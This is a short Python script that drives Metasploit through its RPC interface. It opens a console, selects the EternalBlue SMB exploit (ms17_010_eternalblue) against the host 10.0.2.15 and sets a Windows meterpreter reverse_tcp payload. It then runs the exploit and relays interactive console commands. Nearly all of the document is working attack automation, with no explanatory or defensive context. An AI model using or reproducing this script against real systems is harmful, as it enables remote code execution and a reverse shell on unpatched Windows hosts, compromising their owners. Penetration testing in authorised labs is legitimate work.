from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient("salt", port = 55553, ssl = True)

console_id = client.consoles.console().cid
console = client.consoles.console(console_id)



def attack(Modules_Name: str):
    print(console.read()["data"])
    console.write("use " + Modules_Name)
    print(console.read()["data"])
    console.write("set RHOSTS 10.0.2.15")
    print(console.read()["data"])
    console.write("set payload windows/x64/meterpreter/reverse_tcp")
    print(console.read()["data"])
    console.write("run")

    while True:
        cmd = input()
        if cmd == "read":
            print(console.read()["data"])
        elif cmd == "write":
            console.write(input())
        elif cmd == "exit":
            console.write("exit")
        elif cmd == "break":
            break

attack("exploits/windows/smb/ms17_010_eternalblue")
    # while True:
    #exploit = use(.....)
    # console.run_module_with_output(exploit, windows/x64/meterpreter/reverse_tcp)
    



